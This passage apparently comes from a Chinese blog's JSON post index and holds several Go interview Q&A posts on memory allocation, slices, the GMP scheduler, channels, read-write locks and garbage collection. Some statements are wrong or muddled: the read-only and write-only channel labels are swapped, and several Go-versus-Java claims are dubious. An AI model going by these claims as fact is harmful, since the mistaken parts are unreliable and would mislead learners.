KB）。由于cache为uint64，因此一共可以提供64×8=512KB的连续虚拟内存。在cache中，1代表未分配的内存，0代表已分配的内存。base代表该虚拟内存的基地址。当需要分配的内存小于512/4=128KB时，需要首先从cache中分配。在分配 n 个page 需要查找 cache中是否有连续的n为1的单位，如果存在，在缓存中找到了合适的内存，用于构建Span。\n\nmheap基数树查找\n如果要分配的page过大或者在逻辑处理器P的cache中没有找到可用的page，就需要对mheap加锁，并在整个mheap管理的虚拟地址空间的位图中查找是否有可用的page，这涉及Go语言对线性地址空间的位图管理。\n\n管理线性地址空间的位图结构叫作基数树（radix tree），结构和一般的基数树结构不太一样，会有这个名字很大一部分是由于父节点包含了子节点的若干信息。\n（内存管理基数树结构）\n\n该树中的每个节点都对应一个pallocSum，最底层的叶子节点对应的pallocSum包含一个chunk的信息（512×8KB），除叶子节点外的节点都包含连续8个子节点的内存信息。例如，倒数第2层的节点包含连续8个叶子节点（即8×chunk）的内存信息。因此，越上层的节点对应的内存越多。pallocSum是一个简单的uint64，分为开头（start）、中间（max）、末尾（end）3部分，pallocSum的开头与末尾部分各占21bit，中间部分占22bit，它们分别包含了这个区域中连续空闲内存页的信息，包括开头有多少连续内存页，最多有多少连续内存页，末尾有多少连续内存页。对于最顶层的节点，由于其max位为22bit，因此一棵完整的基数树最多代表2的21次方 pages=16GB内存。不需要每一次查找都从根节点开始。在Go中，存储了一个特别的字段searchAddr，用于搜索可用内存的。利用searchAddr可以加速内存查找。searchAddr有一个重要的设定是它前面的地址一定是已经分配过的，因此在查找时，只需要向searchAddr地址的后方查找即可跳过已经查找的节点，减少查找的时间。\n（利用searchAddr加速内存查找）\n\n在第1次查找时，会从当前searchAddr的chunk块中查找是否有对应大小的连续空间，这种优化主要针对比较小的内存（至少小于512KB）分配。Go对内存有非常精细的管理，chunk块的每个page（8 KB)都有位图表明其是否已经被分配。每个chunk都有一个pallocData结构，其中pallocBits管理其分配的位图。pallocBits是uint64，有8字节，由于其每一位对应一个page，因此pallocBits一共对应64×8=512KB，恰好是一个chunk块的大小。位图的对应方式和之前是一样的。而所有的chunk pallocData都在pageAlloc结构中进行管理。当内存分配过大或者当前chunk块没有连续的npages空间时，需要到基数树中从上到下进行查找。基数树有一个特性——要分配的内存越大，它能够越快地查找到当前的基数树中是否有连续的满足需求的空间。\n在查找基数树的过程中，需要从上到下、从左到右地查找每个节点是否符合要求。先计算pallocSum的开头有多少连续的内存空间，如果大于或等于npages，则说明找到了可用的空间和地址。如果小于npages，则会计算pallocSum字段的max，即中间有多少连续的内存空间。如果max大于或等于npages，那么需要继续向基数树当前节点对应的下一级查找，原因在于，max大于npages，表明当前一定有连续的空间大于或等于npages，但是并不知道具体在哪一个位置，必须查找下一级才能找到可用的地址。如果max也不满足，那么是不是就不满足了呢？不一定，如图18-13所示，有可能两个节点可以合并起来组成一个更大的连续空间。因此还需要将当前pallocSum计算的end与后一个节点的start加起来查看是否能够组合成大于npages的连续空间。\n（更大的可用内存可能跨越了多个pallocSum）\n\n每一次从基数树中查找到内存，或者事后从操作系统分配到内存时，都需要更新基数树中每个节点的pallocSum。\n操作系统内存申请\n当在基数树中查找不到可用的连续内存时，需要从操作系统中获取内存。从操作系统获取内存的代码是平台独立的，（例如在UNIX操作系统中，最终使用了mmap系统调用向操作系统申请内存。）\nGo语言规定，每一次向操作系统申请的内存大小必须为heapArena的倍数。heapArena是和平台有关的内存大小，在64位UNIX操作系统中，其大小为64MB。这意味着即便需要的内存很小，最终也至少要向操作系统申请64MB内存。多申请的内存可以用于下次分配。Go语言中对于heapArena有精准的管理，精准到每个指针大小的内存信息，每个page对应的mspan信息都有记录。\n小对象分配\n当对象不属于微小对象时，在内存分配时会继续判断其是否为小对象，小对象指小于32KB的对象。Go会计算小对象对应哪一个等级的span，并在指定等级的span中查找。此后和微小对象的分配一样，小对象分配经历mcache→mcentral→mheap位图查找→mheap基数树查找→操作系统分配的过程。\n大对象分配\n大对象指大于32KB的对象，内存分配时不与mcache和mcentral沟通，直接通过mheap进行分配。大对象分配经历mheap基数树查找→操作系统分配的过程。每个大对象都是一个特殊的span，其class为0。\ngoroutine 为什么轻量\n从资源消耗方面来看，它只需要一个2Kb的内存栈就可以运行；\n从运行时来看，它的运行成本很低，将一个goroutine切换到另一个goroutine并不需要很多操作\n\ngo 深拷贝发生在什么情况下？切片的深拷贝是怎么做的？深拷贝，浅拷贝概念\n\n深拷贝（Deep Copy）：\n\n拷贝的是数据本身，创造一个样的新对象，新创建的对象与原对象不共享内存，新创建的对象在内存中开辟一个新的内存地址，新对象值修改时不会影响原对象值。既然内存地址不同，释放内存地址时，可分别释放。\n\n浅拷贝（Shallow Copy）：\n\n拷贝的是数据地址，只复制指向的对象的指针，此时新对象和老对象指向的内存地址是一样的，新对象值修改时老对象也会变化。释放内存地址时，同时释放内存地址。参考来源在go语言中值类型赋值都是深拷贝，引用类型一般都是浅拷贝：\n\n值类型的数据，默认全部都是深拷贝：Array、Int、String、Struct、Float，Bool\n引用类型的数据，默认全部都是浅拷贝：Slice，Map\n\n对于引用类型，想实现深拷贝，不能直接 := ，而是要先开辟地址空间（new） ，再进行赋值。\n怎么进行（切片的）深拷贝？\n可以使用 copy() 函数来进行深拷贝，copy 不会进行扩容，当要复制的 slice 比原 slice 要大的时候，只会移除多余的。\nfunc main() &#123;    slice1 := []int&#123;1, 2, 3, 4, 5&#125;    slice2 := []int&#123;6, 7, 8&#125;    copy(slice2, slice1) // 复制slice1的前3个元素到slice2中    fmt.Println(slice1, slice2)    copy(slice1, slice2) // 复制slice2的3个元素到slice1的前3个位置    fmt.Println(slice1, slice2)&#125;\n\n使用 append() 函数来进行深拷贝，append 会进行扩容（这里涉及到的就是 Slice 的扩容机制 ）。\nfunc main() &#123;    a := []int&#123;1, 2, 3&#125;    b := make([]int, 0)    b = append(b, a[:]...)    fmt.Println(a, b)    a[1] = 1000    fmt.Println(a, b)    fmt.Printf(&quot;%p,%p&quot;, a, b)&#125;\n\n\nGo 中切片扩容的策略：\n\n首先判断，如果新申请容量大于 2 倍的旧容量，最终容量就是新申请的容 量\n否则判断，如果旧切片的长度小于 1024，则最终容量就是旧容量的两倍\n否则判断，如果旧切片长度大于等于 1024，则最终容量从旧容量开始循环 增加原来的 1/4, 直到最终容量大于等于新申请的容量\n如果最终容量计算值溢出，则最终容量就是新申请容量\n\n注意：如果 slice 在 append() 过程中没有发生扩容，那么修改就在原来的内存中，如果发生了扩容，就修改在新的内存中。\n\n","categories":["Golang","面试题","内存管理","并发编程"],"tags":["Golang","Go面试题","Channel","Slice","线程安全","Map","内存模型","mheap","mcache","mcentral","深拷贝","浅拷贝","并发安全","make","new"]},{"title":"Golang面试题详解（二）：GMP模型、Channel底层原理及Go与Java对比","url":"/posts/30645.html","content":"Golang题库（二）数组怎么转集合?无法直接转换，需要通过遍历数组，构造一个map。例如：\nfunc main() &#123;\tarr := [5]int&#123;1, 2, 3, 4, 5&#125;\tm := make(map[int]int, 5)\tfor i, v := range arr &#123;\t\tm[i] = v\t&#125;\tfmt.Println(m)&#125;\n\n⭐Go的GMP模型?G是Goroutine的缩写，相当于操作系统的进程控制块(process control block)。它包含：函数执行的指令和参数，任务对象，线程上下文切换，字段保护，和字段的寄存器。\nM是一个线程，每个M都有一个线程的栈。如果没有给线程的栈分配内存，操作系统会给线程的栈分配默认的内存。当线程的栈制定，M.stack-&gt;G.stack, M的PC寄存器会执行G提供的函数。\nP(处理器，Processor)是一个抽象的概念，不是物理上的CPU。当一个P有任务，需要创建或者唤醒一个系统线程去处理它队列中的任务。P决定同时执行的任务的数量，GOMAXPROCS限制系统线程执行用户层面的任务的数量。\nGO调度器的调度过程，首先创建一个G对象，然后G被保存在P的本地队列或者全局队列（global queue）。这时P会唤醒一个M。P按照它的执行顺序继续执行任务。M寻找一个空闲的P，如果找得到，将G与自己绑定。然后M执行一个调度循环：调用G对象-&gt;执行-&gt;清理线程-&gt;继续寻找Goroutine。\n在M的执行过程中，上下文切换随时发生。当切换发生，任务的执行现场需要被保护，这样在下一次调度执行可以进行现场恢复。M的栈保存在G对象中，只有现场恢复需要的寄存器(SP,PC等)，需要被保存到G对象。\n如果G对象还没有被执行，M可以将G重新放到P的调度队列，等待下一次的调度执行。当调度执行时，M可以通过G的vdsoSP, vdsoPC 寄存器进行现场恢复。\nP队列 P有2种类型的队列：\n\n本地队列：本地的队列是无锁的，没有数据竞争问题，处理速度比较高。\n全局队列：是用来平衡不同的P的任务数量，所有的M共享P的全局队列。\n\n线程清理 G的调度是为了实现P/M的绑定，所以线程清理就是释放P上的G，让其他的G能够被调度。\n\n主动释放(active release)：典型的例子是，执行G任务时，发生了系统调用(system call)，这时M会处于阻塞（Block）状态。调度器会设置一个超时时间，来释放P。\n被动释放(passive release)：如果系统调用发生，监控程序需要扫描处于阻塞状态的P/M。 这时，超时之后，P资源会回收，程序被安排给队列中的其他G任务。\n\nGo和java比有什么不同?Go也称为Golang，是一种开源编程语言，Go可以轻松构建可靠，简单和高效的软件。Go是键入的静态编译语言。Go语言提供垃圾收机制，CSP风格的并发性，内存安全性和结构类型。\nJava是一种用于一般用途的计算机编程语言，它是基于类的，并发的和面向对象的。Java专门设计为包含很少的实现依赖项。Java应用程序在JVM（Java虚拟机）上运行。它是当今最著名的编程语言之一。Java是一种用于为多个平台开发软件的编程语言。Java应用程序上的编译代码或字节码可以在大多数操作系统上运行，包括Linux，Mac操作系统和Linux。Java的大部分语法都源自C ++和C语言。\ngo语言和java之间的区别\n\n函数重载\nGo上不允许函数重载，必须具有方法和函数的唯一名称；\njava允许函数重载。\n\n速度\ngo的速度比java快\n\n多态\nJava默认允许多态。而Go没有。\n\n路由配置\nGo语言使用HTTP协议进行路由配置；\njava使用Akka.routing.ConsistentHashingRouter和Akka.routing.ScatterGatherFirstCompletedRouter进行路由配置。\n\n可扩展性\nGo代码可以自动扩展到多个核心；而Java并不总是具有足够的可扩展性。\n\n继承\nGo语言的继承通过匿名组合完成：基类以Struct的方式定义，子类只需要把基类作为成员放在子类的定义中，支持多继承；\nJava的继承通过extends关键字完成，不支持多继承。\n\n\n介绍一下channelChannel是Go里面的一种并发原语，每一个管道对象都有一种具体的类型，例如chan int一种传输int类型的管道。\nchan是一种在函数传输中是一种引用类型，同其他引用类型一样，零值为nil。\n通道有两个主要操作：发送(send)和接收(receive)，两者统称为通信。send语句从一个goroutine传输一个值到另一个在执行接收表达式的goroutine。两个操作都使用&lt;-操作符书写。发送语句中，通道和值分别在&lt;-的左右两边。在接收表达式中，&lt;-放在通道操作数前面，在接收表达式中，其结果未被使用也是合法的。\nch &lt;- x\t\t//发送语句x = &lt;-ch\t//接收语句&lt;-ch\t\t//接收语句，丢弃结果\n\n通道支持第三个操作：关闭 (close)，它设置一个标志位来指示值当前已经发送完毕，这个通道后面没有值了；关闭后的发送操作将导致宕机。在一个已经关闭的通道上进行接收操作，将获取所有已经发送的值，直到通道为空；这时任何接收操作会立即完成，同时获取到一个通道元素对应的零值。通过调用内置的close函数来关闭通道：\nclose(ch)\n\n根据通道的容量，可以将通道分为无缓冲通道和缓冲通道\n\n无缓冲通道\nch = make(chan int)ch = make(chan int, 0)\n有缓冲通道\nch = make(chan int, 3)\n\n根据通道传输方向，还可以通道分为双向通道，只读通道和只写通道\n\n只读通道\n只能发送的通道，允许发送但不允许接收\nchan&lt;- int\n只写通道\n只能接收的通道，允许接收但不允许发送\n&lt;-chan int\n\nchannel实现方式/原理/概念/底层实现背景：\n\nGo语言提供了一种不同的并发模型–通信顺序进程(communicating sequential processes,CSP)。\n设计模式：通过通信的方式共享内存\nchannel收发操作遵循先进先出(FIFO)的设计\n\n底层结构:\ntype hchan struct &#123;    qcount   uint           // channel中的元素个数    dataqsiz uint           // channel中循环队列的长度    buf      unsafe.Pointer // channel缓冲区数据指针    elemsize uint16            // buffer中每个元素的大小    closed   uint32            // channel是否已经关闭，0未关闭    elemtype *_type // channel中的元素的类型    sendx    uint   // channel发送操作处理到的位置    recvx    uint   // channel接收操作处理到的位置    recvq    waitq  // 等待接收的sudog（sudog为封装了goroutine和数据的结构）队列由于缓冲区空间不足而阻塞的Goroutine列表    sendq    waitq  // 等待发送的sudogo队列，由于缓冲区空间不足而阻塞的Goroutine列表    lock mutex   // 一个轻量级锁&#125;\n\nchannel创建:\nch := make(chan int, 3)\n\n\n创建channel实际上就是在内存中实例化了一个hchan结构体，并返回一个chan指针\nchannle在函数间传递都是使用的这个指针，这就是为什么函数传递中无需使用channel的指针，而是直接用channel就行了，因为channel本身就是一个指针\n\nchannel发送数据：\nch &lt;- 1ch &lt;- 2\n\n\n检查 recvq 是否为空，如果不为空，则从 recvq 头部取一个 goroutine，将数据发送过去，并唤醒对应的 goroutine 即可。\n如果 recvq 为空，则将数据放入到 buffer 中。\n如果 buffer 已满，则将要发送的数据和当前 goroutine 打包成 sudog 对象放入到 sendq中。并将当前 goroutine 置为 waiting 状态。\n\nchannel接收数据：\n&lt;-ch&lt;-ch\n\n\n检查sendq是否为空，如果不为空，且没有缓冲区，则从sendq头部取一个goroutine，将数据读取出来，并唤醒对应的goroutine，结束读取过程。\n如果sendq不为空，且有缓冲区，则说明缓冲区已满，则从缓冲区中首部读出数据，把sendq头部的goroutine数据写入缓冲区尾部，并将goroutine唤醒，结束读取过程。\n如果sendq为空，缓冲区有数据，则直接从缓冲区读取数据，结束读取过程。\n如果sendq为空，且缓冲区没数据，则只能将当前的goroutine加入到recvq,并进入waiting状态，等待被写goroutine唤醒。\n\nchannel规则：\n\n\n\n操作\n空channel\n已关闭channel\n活跃中的channel\n\n\n\nclose(ch)\npanic\npanic\n成功关闭\n\n\nch&lt;- v\n永远阻塞\npanic\n成功发送或阻塞\n\n\nv,ok = &lt;-ch\n永远阻塞\n不阻塞\n成功接收或阻塞\n\n\n","categories":["Golang","面试题","GMP模型"],"tags":["Golang","Go面试题","Channel","GMP","协程调度","hchan","Go与Java"]},{"title":"Golang面试题详解（五）：热部署、读写锁、Goroutine与线程","url":"/posts/55219.html","content":"Golang题库（五）go 实现不重启热部署根据SIGHUP 信号量根据系统的 SIGHUP 信号量，以此信号量触发进程重启，达到热更新的效果。\n热部署我们需要考虑几个能力：\n\n新进程启动成功，老进程不会有资源残留\n新进程初始化的过程中，服务不会中断\n新进程初始化失败，老进程仍然继续工作\n同一时间，只能有一个更新动作执行\n\n监听信号量的方法的环境是在 类 UNIX 系统中，在现在的 UNIX 内核中，允许多个进程同时监听一个端口。在收到 SIGHUP 信号量时，先 fork 出一个新的进程监听端口，同时等待旧进程处理完已经进来的连接，最后杀掉旧进程。\n使用air包air包可以实现插件化热更新的方案，集成方便，非常适用于小型项目的开发。\n⭐saas灰度发布介绍灰度发布常见有三种模式金丝雀发布、滚动发布、蓝绿发布。灰度发布主要是更新服务中，通过服务的多节点、多切片进行无感知的服务更新迭代。阿里云、AWS等云平台都已支持灰度发布功能。\n实现灰度发布主要是通过网关转发的均衡负载，确保服务更新过程中能够不停机、无感知、可回溯。常见的灰度发布实现方案有Nginx +Lua + Redis 实现灰度发布、Openresty+Lua+Redis灰度发布、Treafit+golang+Redis灰度发布。\n缺点一套成熟的灰度发布系统，是需要有运维去维护的，需要一定的人力成本。同时灰度发布不适用于敏捷开发，对于需要敏捷开发的团队来说，通常业务变动频繁，版本管理和代码审核都会缺少严谨，徒增成本。\n🪫（待补充）读写锁底层是怎么实现的读写锁的底层是基于互斥锁实现的。\n\n为什么有读写锁，它解决了什么问题？（使用场景）\n它的底层原理是什么？\n\n在这里我会结合 Go 中的读写锁 RWMutex 进行介绍。\n我们通过与 Mutex 对比得出答案。Mutex 是不区分 goroutine 对共享资源的操作行为的，在读操作、它会上锁，在写操作，它也会上锁，当一段时间内，读操作居多时，读操作在 Mutex 的保护下也不得不变为串行访问，对性能的影响也就比较大了。\nRWMutex 读写锁的诞生为了区分读写操作，在进行读操作时，goroutine 就不必傻傻的等待了，而是可以并发地访问共享资源，将串行读变成了并行读，提高了读操作的性能。\n读写锁针对解决一类问题：readers-writes ，同时有多个读或者多个写操作时，只要有一个线程在执行写操作，其他的线程都不能进行读操作。\n读写锁其实有三种工作模型：\n\nRead-perferring优先读设计，可能会导致写饥饿\nWrite-prferring优先写设计，避免写饥饿\n不指定优先级不区分优先级，解决饥饿问题\n\nGo 中的读写锁，工作模型是 Write-prferring 方案。\n\n读写锁解决问题\n主要应用于写操作少，读操作多的场景。读写锁满足以下四条规则。\n\n写锁需要阻塞写锁：一个协程拥有写锁时，其他协程写锁定需要阻塞；\n写锁需要阻塞读锁：一个协程拥有写锁时，其他协程读锁定需要阻塞；\n读锁需要阻塞写锁：一个协程拥有读锁时，其他协程写锁定需要阻塞；\n读锁不能阻塞读锁：一个协程拥有读锁时，其他协程也可以拥有读锁。\n\n\n读写锁底层实现\n读写锁内部仍有一个互斥锁，用于将多个写操作隔离开来，其他几个都用于隔离读操作和写操作。\n源码包src/sync/rmmutex.go:RWMutex中定义了读写锁的数据结构 \ntype RWMutex struct &#123;    w Mutex // held if there are pending writers    writerSem uint32 // semaphore for writers to wait for completing readers    readerSem uint32 // semaphore for readers to wait for completing writers    readerCount int32 // number of pending readers    readerWait int32 // number of departing readers&#125;\n\n数组是如何实现用下标访问任意元素的数组是分配了一段连续内存的类型，数组索引函数通过数组类型记录的第一个元素地址即数组起始地址开始进行运算，下标从0开始，每+1即从起始地址 +1进行取值。\n2个协程交替打印字母和数字package mainimport (\t&quot;fmt&quot;)func main() &#123;\tlimit := 26\tnumChan := make(chan int, 1)\tcharChan := make(chan int, 1)\tmainChan := make(chan int, 1)\tcharChan &lt;- 1\tgo func() &#123;\t\tfor i := 0; i &lt; limit; i++ &#123;\t\t\t&lt;-charChan\t\t\tfmt.Printf(&quot;%c\\n&quot;, &#x27;a&#x27;+i)\t\t\tnumChan &lt;- 1\t\t&#125;\t&#125;()\tgo func() &#123;\t\tfor i := 0; i &lt; limit; i++ &#123;\t\t\t&lt;-numChan\t\t\tfmt.Println(i)\t\t\tcharChan &lt;- 1\t\t&#125;\t\tmainChan &lt;- 1\t&#125;()\t&lt;-mainChan\tclose(charChan)\tclose(numChan)\tclose(mainChan)&#125;\n\n🪫（待补充，python协程线程进程机制更复杂）goroutine与线程的区别？\n一个线程可以有多个协程\n线程、进程都是同步机制，而协程是异步\n协程可以保留上一次调用时的状态，当过程重入时，相当于进入了上一次的调用状态\n协程是需要线程来承载运行的，所以协程并不能取代线程，线程是被分割的CPU资源，协程是组织好的代码流程\n\n","categories":["Golang","面试题","系统设计","并发编程"],"tags":["Golang","并发编程","Go面试题","热部署","灰度发布","RWMutex","读写锁","Goroutine","线程"]},{"title":"Golang面试题详解（六）：GMP模型、GC、深浅拷贝及Channel应用","url":"/posts/40874.html","content":"Golang题库（六）✨讲一讲 GMP 模型三个字母的含义\n\nG（Goroutine）：G 就是我们所说的 Go 语言中的协程 Goroutine 的缩写，相当于操作系统中的进程控制块。其中存着 goroutine 的运行时栈信息，CPU 的一些寄存器的值以及执行的函数指令等。\nM（Machine）：代表一个操作系统的主线程，对内核级线程的封装，数量对应真实的 CPU 数。一个 M 直接关联一个 os 内核线程，用于执行 G。M 会优先从关联的 P 的本地队列中直接获取待执行的 G。M 保存了 M 自身使用的栈信息、当前正在 M上执行的 G 信息、与之绑定的 P 信息。\nP（Processor）：Processor 代表了 M 所需的上下文环境，代表 M 运行 G 所需要的资源。是处理用户级代码逻辑的处理器，可以将其看作一个局部调度器使 go 代码在一个线程上跑。当 P 有任务时，就需要创建或者唤醒一个系统线程来执行它队列里的任务，所以 P 和 M 是相互绑定的。总的来说，P 可以根据实际情况开启协程去工作，它包含了运行 goroutine 的资源，如果线程想运行 goroutine，必须先获取 P，P 中还包含了可运行的 G 队列。\n\n源码\n\nG\n\ntype g struct &#123;  stack       stack   \t\t// 描述真实的栈内存，包括上下界  m              *m     \t// 当前的 m  sched          gobuf   \t// goroutine 切换时，用于保存 g 的上下文        param          unsafe.Pointer // 用于传递参数，睡眠时其他 goroutine 可以设置 param，唤醒时该goroutine可以获取  atomicstatus   uint32  stackLock      uint32   goid           int64  \t// goroutine 的 ID  waitsince      int64 \t\t// g 被阻塞的大体时间  lockedm        *m     \t// G 被锁定只在这个 m 上运行&#125;\n\n其中 sched 比较重要，该字段保存了 goroutine 的上下文。goroutine 切换的时候不同于线程有 OS 来负责这部分数据，而是由一个 gobuf 结构体来保存，gobuf 的结构如下：\ntype gobuf struct &#123;    sp   uintptr    pc   uintptr    g    guintptr    ctxt unsafe.Pointer    ret  sys.Uintreg    lr   uintptr    bp   uintptr // for GOEXPERIMENT=framepointer&#125;\n\n这里可以看出该结构体保存了当前的栈指针，计数器，还有 g 自身，这里记录自身 g 的指针的目的是为了能快速的访问到 goroutine 中的信息。\n\nM\n\ntype m struct &#123;    g0      *g     \t\t\t\t// 带有调度栈的goroutine    gsignal       *g         \t// 处理信号的goroutine    tls           [6]uintptr \t// thread-local storage    mstartfn      func()    curg          *g       \t\t// 当前运行的goroutine    caughtsig     guintptr     p             puintptr \t\t// 关联p和执行的go代码    nextp         puintptr    id            int32    mallocing     int32 \t\t// 状态    spinning      bool \t\t\t// m是否out of work    blocked       bool \t\t\t// m是否被阻塞    inwb          bool \t\t\t// m是否在执行写屏蔽    printlock     int8    incgo         bool    fastrand      uint32    ncgocall      uint64      \t// cgo调用的总数    ncgo          int32       \t// 当前cgo调用的数目    park          note    alllink       *m \t\t\t// 用于链接allm    schedlink     muintptr    mcache        *mcache \t\t// 当前m的内存缓存    lockedg       *g \t\t\t// 锁定g在当前m上执行，而不会切换到其他m    createstack   [32]uintptr \t// thread创建的栈&#125;\n\n结构体 M 中，有两个重要的字段：\n\ncurg：代表结构体M当前绑定的结构体 G 。\ng0 ：是带有调度栈的 goroutine，普通的 goroutine 的栈是在堆上分配的可增长的栈，但是 g0 的栈是 M 对应的线程的栈。与调度相关的代码，会先切换到该 goroutine 的栈中再执行。\n\n\nP\n\ntype p struct &#123;    lock mutex    id          int32    status      uint32 \t\t// 状态，可以为pidle/prunning/...    link        puintptr    schedtick   uint32     // 每调度一次加1    syscalltick uint32     // 每一次系统调用加1    sysmontick  sysmontick     m           muintptr   // 回链到关联的m    mcache      *mcache    racectx     uintptr    goidcache    uint64 \t// goroutine的ID的缓存    goidcacheend uint64    // 可运行的goroutine的队列    runqhead uint32    runqtail uint32    runq     [256]guintptr    runnext guintptr \t\t// 下一个运行的g    sudogcache []*sudog    sudogbuf   [128]*sudog    palloc persistentAlloc // per-P to avoid mutex    pad [sys.CacheLineSize]byte&#125;\n\n\nP 的个数就是 GOMAXPROCS（最大256），启动时固定的，一般不修改；GOMAXPOCS 默认值是当前电脑的核心数，单核CPU就只能设置为1，如果设置&gt;1，在 GOMAXPOCS 函数中也会被修改为1。\nM 的个数和P 的个数不一定一样多（会有休眠的M或者不需要太多的 M）（M 最大10000）；\n每一个 P 保存着本地 G 任务队列，也有一个全局 G 任务队列。\n\n模型介绍\n本地队列：存放等待运行的 G，一个本地队列存放的G数量一般不超过 256 个，优先将新创建的 G 放在 P 的本地队列中，如果满了会放在全局队列中。全局队列：存放等待运行的 G，读写要加锁，所以拿取效率在多线程竞争的情况下相比于本地队列来说要低。\n面试回答模板\n首先呢，GMP 这三个字母的含义分别是 Goroutine，Machine，Processor。这个Goroutine，相当于操作系统中的进程控制块。其中存着 goroutine 的运行时栈信息，CPU 的一些寄存器的值以及执行的函数指令等。Machine就是代表了一个操作系统的主线。M 结构体中，保存了 M 自身使用的栈信息、当前正在 M上执行的 G 信息、与之绑定的 P 信息。M 直接关联一个 os 内核线程，用于执行 G。（这里思考一个这个模型的图片回答），这个 M 做的事情就是从关联的 P 的本地队列中直接获取待执行的 G。剩下的 Processor 是代表了 M 所需的上下文环境，代表 M 运行 G 所需要的资源。当 P 有任务时，就需要创建或者唤醒一个系统线程来执行它队列里的任务。在GMP调度模型中，P 的个数就是 GOMAXPROCS，是可以手动设置的，但一般不修改，GOMAXPOCS 默认值是当前电脑的核心数，单核CPU就只能设置为1，如果设置&gt;1，在 GOMAXPOCS 函数中也会被修改为1。总的来说，这个 P 结构体的主要的任务就是可以根据实际情况开启协程去工作。\n🌟了解的GC算法有哪些？常见的垃圾回收算法有以下几种：\n引用计数引用计数：对每个对象维护一个引用计数，当引用该对象的对象被销毁时，引用计数减1，当引用计数器为0时回收该对象。优点：对象可以很快的被回收，不会出现内存耗尽或达到某个阀值时才回收。缺点：不能很好的处理循环引用，而且实时维护引用计数，有也一定的代价。代表语言：Python、PHP\n标记-清除标记-清除：从根变量开始遍历所有引用的对象，引用的对象标记为”被引用”，没有被标记的进行回收。优点：解决了引用计数的缺点。缺点：需要STW，即要暂时停掉程序运行。代表语言：Golang(其采用三色标记法)\n分代收集分代收集：按照对象生命周期长短划分不同的代空间，生命周期长的放入老年代，而短的放入新生代，不同代有不能的回收算法和回收频率。优点：回收性能好缺点：算法复杂代表语言： JAVA\n三色标记法\n初始状态下所有对象都是白色的。\n\n从根节点开始遍历所有对象，把遍历到的对象变成灰色对象\n\n遍历灰色对象，将灰色对象引用的对象也变成灰色，然后将遍历过的灰色对象变成黑色对象。\n\n循环步骤3，直到灰色对象全部变黑色。\n\n回收所有白色对象（垃圾）。\n\n\ngo垃圾回收，什么时候触发主动触发主动触发(手动触发)，通过调用 runtime.GC 来触发GC，此调用阻塞式地等待当前GC运行完毕。\n被动触发被动触发，分为两种方式：\n\n使用步调（Pacing）算法，其核心思想是控制内存增长的比例,每次内存分配时检查当前内存分配量是否已达到阈值（环境变量GOGC）：默认100%，即当内存扩大一倍时启用GC。\n使用系统监控，当超过两分钟没有产生任何GC时，强制触发 GC。\n\n深拷贝和浅拷贝深拷贝拷贝的是数据本身，创造一个新对象，新创建的对象与原对象不共享内存，新创建的对象在内存中开辟一个新的内存地址，新对象值修改时不会影响原对象值。\n浅拷贝拷贝的是数据地址，只复制指向的对象的指针，此时新对象和老对象指向的内存地址是一样的，新对象值修改时老对象也会变化。实现浅拷贝的方式：引用类型的变量,默认赋值操作就是浅拷贝\n为什么不要大量使用goroutine合理复用协程\n使用goroutine可以帮助提高程序的并发性和性能，但是过度使用goroutine会带来一些问题，例如：\n\n内存占用增加，因为每个goroutine都需要占用一定的内存\n过多的goroutine会导致CPU上下文切换频繁，影响程序性能\n如果goroutine没有正确的管理，可能会导致资源泄漏或死锁为了优化这些问题，可以考虑以下方法：\n确定适当的goroutine数量，避免过度使用goroutine。\n使用有限的goroutine池，以限制goroutine的总数，并避免内存占用过多。\n优化goroutine的调度，以减少CPU上下文切换的次数。\n使用通道和其他同步原语来避免竞争条件和死锁。\n\nchannel有缓冲和无缓冲在使用上有什么区别？无缓冲：发送和接收需要同步。有缓冲：不要求发送和接收同步，缓冲满时发送阻塞。因此 channel 无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据；channel有缓冲时，当缓冲满时发送阻塞，当缓冲空时接收阻塞。\ngo 的优势\n与其他作为学术实验开始的语言不同，Go 代码的设计是务实的。每个功能和语法决策都旨在让程序员的生活更轻松。\n\nGolang针对并发进行了优化，并且在规模上运行良好。\n\n由于单一的标准代码格式，Golang 通常被认为比其他语言更具可读性。\n\n自动垃圾收集明显比 Java 或 Python 更有效，因为它与程序同时执行。\n\nGo在语言层面支持高并发\n\nGo属于开发效率和运行效率折中的一门语言\n\n\n如何判断channel是否关闭？\n读channel的时候判断其是否已经关闭_,ok := &lt;- jobs此时如果 channel 关闭，ok 值为 false\n\n写入channel的时候判断其是否已经关闭\n\n_,ok := &lt;- jobs\n此时如果 channel 关闭，ok 值为 false，如果 channel 没有关闭，则会漏掉一个 jobs中的一个数据\n\n使用 select 方式\n再创建一个 channel，叫做 timeout，如果超时往这个 channel 发送 true，在生产者发送数据给 jobs 的 channel，用 select 监听 timeout，如果超时则关闭 jobs 的 channel。\n\n\n\n\nmake 与 new 的区别引用类型与值类型\n引用类型 变量存储的是一个地址，这个地址存储最终的值。内存通常在堆上分配。通过 GC 回收。包括 指针、slice 切片、管道 channel、接口 interface、map、函数等。\n值类型是 基本数据类型，int,float,bool,string, 以及数组和 struct 特点：变量直接存储值，内存通常在栈中分配，栈在函数调用后会被释放\n对于引用类型的变量，我们不光要声明它，还要为它分配内容空间\n对于值类型的则不需要显示分配内存空间，是因为go会默认帮我们分配好\nnew()\nfunc new(Type) *Type\n\nnew()对类型进行内存分配,入参为类型,返回为类型的指针，指向分配类型的内存地址\nmake()\nfunc make(t Type, size ...IntegerType) Type\n\nmake()也是用于内存分配的，但是和new不同，它只用于channel、map以及切片的内存创建，而且它返回的类型就是这三个类型本身，而不是他们的指针类型，因为这三种类型就是引用类型，所以就没有必要返回他们的指针了。\n注意，因为这三种类型是引用类型，所以必须得初始化，但是不是置为零值，这个和new是不一样的。\n简而言之make()用于初始化slice, map, channel等内置数据结构\n","categories":["Golang","面试题","GMP模型","垃圾回收"],"tags":["Golang","Go面试题","Channel","深拷贝","浅拷贝","make","new","GMP","GC","垃圾回收"]},{"title":"Golang面试题详解（八）：GC、GMP、逃逸分析与并发陷阱","url":"/posts/6059.html","content":"Golang题库（八）go语言的引用类型有什么？\n切片(slice)类型\nmap类型 \n管道(channel)类型\n接口(interface)类型\n\nmap的key可以是哪些类型？可以嵌套map吗？\nkey的类型\nbool, \nint，\nstring,\n指针\nchannel \ninterface \nstructs\narrays \n\n\nmap是可以进行嵌套的。\n\n协程goroutine协程是一种用户态的轻量级线程，协程的调度完全由用户控制（进程和线程都是由cpu 